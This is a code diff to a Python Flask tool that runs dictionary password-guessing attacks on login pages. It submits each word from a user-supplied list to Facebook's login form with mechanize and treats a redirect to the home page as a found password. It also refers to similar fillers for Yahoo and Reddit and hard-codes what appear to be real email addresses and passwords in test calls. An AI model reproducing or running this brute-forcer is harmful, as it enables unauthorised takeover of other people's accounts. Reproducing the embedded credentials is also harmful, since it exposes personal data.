@@ -87,12 +87,15 @@ def dictionary_alg():
     dictionaryChunk = request.form["dictionary"]
     dictionary = dictionaryChunk.split()
     for word in dictionary:
+        print(word+"jh")
         found = facebook_form_filler(username, word)
+        print(found)
         if found:
-            return password
+            print("found!!!!!!!!!!!!!!")
+            password = word
             break
     if password != None:
-        return render_template('result.html',username = "tarabite@yahoo.com", password = "ggggggoo")
+        return render_template('result.html',username = "tarabite@yahoo.com", password = password)
     else:
         return render_template('500_bf.html')
 
@@ -164,6 +167,20 @@ def facebook_form_filler(email, password):
     br.form['email'] = email
     br.form['pass'] = password
     result = br.submit(id='u_0_2')
+    print(result.geturl())
+    return result.geturl() == "https://www.facebook.com/"
+def facebook_form_filler1(email, password):
+    br = mechanize.Browser()
+    #br.set_all_readonly(False)    # allow everything to be written to
+    br.set_handle_robots(False)   # no robots
+    br.set_handle_refresh(False)  # can sometimes hang without this
+    response = br.open("https://www.facebook.com/login")
+    br.form = list(br.forms())[0]
+    br.form.set_all_readonly(False)
+    br.form['email'] = email
+    br.form['pass'] = password
+    result = br.submit(id='loginbutton')
+    print(result.geturl())
     return result.geturl() == "https://www.facebook.com/"
 # fill the form for yahoo profiles
 def yahoo_form_filler(email, password):
@@ -229,7 +246,7 @@ def reddit_form_filler(email, password):
     #     print(control)
     #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))
 
-print(facebook_form_filler("tarabite@yahoo.com","ggggggoo"))
+print(facebook_form_filler("tarabite1998@gmail.com","ggggggoo"))
 #instagram_form_filler("tarabite@yahoo.com","gobuckeyes")
 #print(facebook_form_filler("tarabite@yahoo.com","ggggggoo"))
 #yahoo_form_filler("tarabite@yahoo.com","gobuckeyes")
